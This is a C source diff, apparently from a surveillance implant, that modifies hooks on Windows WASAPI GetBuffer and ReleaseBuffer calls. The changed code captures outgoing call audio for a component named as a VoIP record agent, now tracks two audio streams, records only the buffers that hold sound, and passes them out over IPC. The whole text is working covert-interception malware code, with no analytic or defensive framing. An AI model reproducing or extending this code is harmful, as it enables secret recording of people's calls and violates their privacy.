@@ -626,6 +626,8 @@ typedef struct {
 	BYTE *obj_ptr2;
 	BYTE *audio_data;
 	BYTE *audio_data2;
+	BOOL active;
+	BOOL active2;
 } WASAPIGetBufferStruct;
 
 WASAPIGetBufferStruct WASAPIGetBufferData;
@@ -645,8 +647,30 @@ HRESULT __stdcall PM_WASAPIGetBuffer(BYTE *class_ptr,
 	if (ret_code!=S_OK || !Active || !(*Active))
 		return ret_code;
 
-	pData->obj_ptr = class_ptr;
-	pData->audio_data = *ppData;
+	// E' una nuova chiamata
+	if (pData->obj_ptr && pData->obj_ptr2 && pData->obj_ptr!=class_ptr && pData->obj_ptr2!=class_ptr) {
+		pData->obj_ptr = NULL;
+		pData->obj_ptr2 = NULL;
+		pData->active = FALSE;
+		pData->active2 = FALSE;
+	}
+
+	// Memorizza 2 oggetti
+	if (pData->obj_ptr == NULL) {
+		pData->obj_ptr = class_ptr;
+		pData->audio_data = *ppData;
+	} else if (pData->obj_ptr != class_ptr) {
+		if (pData->obj_ptr2 == NULL) {
+			pData->obj_ptr2 = class_ptr;
+			pData->audio_data2 = *ppData;
+		}
+	}
+
+	if (pData->obj_ptr == class_ptr)
+		pData->audio_data = *ppData;
+
+	if (pData->obj_ptr2 == class_ptr)
+		pData->audio_data2 = *ppData;	
 	
 	return ret_code;
 }
@@ -670,7 +694,11 @@ DWORD PM_WASAPIGetBuffer_setup(HMServiceStruct *pData)
 	WASAPIGetBufferData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
 	WASAPIGetBufferData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
 	WASAPIGetBufferData.obj_ptr = NULL;
+	WASAPIGetBufferData.obj_ptr2 = NULL;
 	WASAPIGetBufferData.audio_data = NULL;
+	WASAPIGetBufferData.audio_data2 = NULL;
+	WASAPIGetBufferData.active = FALSE;
+	WASAPIGetBufferData.active2 = FALSE;
 
 	if (GetWASAPIRenderFunction(&(WASAPIGetBufferData.bAPIAdd), WASAPI_GETBUFFER, NULL, NULL) != S_OK)
 		return 1;
@@ -694,22 +722,45 @@ HRESULT __stdcall PM_WASAPIReleaseBuffer(BYTE *class_ptr,
 									 DWORD Flags)
 {
 	BOOL *Active;
+	DWORD i;
 
 	MARK_HOOK
 	INIT_WRAPPER(WASAPIReleaseBufferStruct)
 	
 	// Controlla se il monitor e' attivo
 	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
-	if (Active && (*Active)) {
-		// Solo se e' una Release sull'ultimo oggetto su cui ha fatto la GetBuffer
-		if (pData->c_data->obj_ptr==class_ptr && NumFramesWrittem>0 && pData->pHM_IpcCliWrite) {
-			if (pData->sampling != 0) {
-				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)&(pData->sampling), 4, FLAGS_SAMPLING | FLAGS_OUTPUT, IPC_HI_PRIORITY);
-				pData->sampling = 0;
-			}
-			LARGE_CLI_WRITE(pData->c_data->audio_data, NumFramesWrittem*SKYPE_WASAPI_BITS*pData->n_channels, ((pData->n_channels)<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
-			pData->c_data->obj_ptr = NULL;
+	if (Active && (*Active) && NumFramesWrittem>0 && pData->pHM_IpcCliWrite) {
+		if (pData->sampling != 0) {
+			pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)&(pData->sampling), 4, FLAGS_SAMPLING | FLAGS_OUTPUT, IPC_HI_PRIORITY);
+			pData->sampling = 0;
 		}
+
+		if (pData->c_data->obj_ptr==class_ptr) {
+			// Vede se e' un oggetto in cui sta scrivendo qualcosa
+			if (!pData->c_data->active)
+				for (i=0; i<256; i++) { 
+					if (pData->c_data->audio_data[i] != 0) {
+						pData->c_data->active = TRUE;
+						break;
+					}
+				}
+			if (pData->c_data->active) 
+				LARGE_CLI_WRITE(pData->c_data->audio_data, NumFramesWrittem*SKYPE_WASAPI_BITS*pData->n_channels, ((pData->n_channels)<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
+		}
+
+		if (pData->c_data->obj_ptr2==class_ptr) {
+			// Vede se e' un oggetto in cui sta scrivendo qualcosa
+			if (!pData->c_data->active2)
+				for (i=0; i<256; i++) { 
+					if (pData->c_data->audio_data2[i] != 0) {
+						pData->c_data->active2 = TRUE;
+						break;
+					}
+				}
+			if (pData->c_data->active2) 
+				LARGE_CLI_WRITE(pData->c_data->audio_data2, NumFramesWrittem*SKYPE_WASAPI_BITS*pData->n_channels, ((pData->n_channels)<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
+		}
+
 	}
 
 	CALL_ORIGINAL_API(3);
@@ -740,7 +791,7 @@ DWORD PM_WASAPIReleaseBuffer_setup(HMServiceStruct *pData)
 	if (GetWASAPIRenderFunction(&(WASAPIReleaseBufferData.bAPIAdd), WASAPI_RELEASEBUFFER, &(WASAPIReleaseBufferData.n_channels), &(WASAPIReleaseBufferData.sampling)) != S_OK)
 		return 1;
 
-	WASAPIReleaseBufferData.dwHookLen = 700;
+	WASAPIReleaseBufferData.dwHookLen = 800;
 	return 0;
 }
 
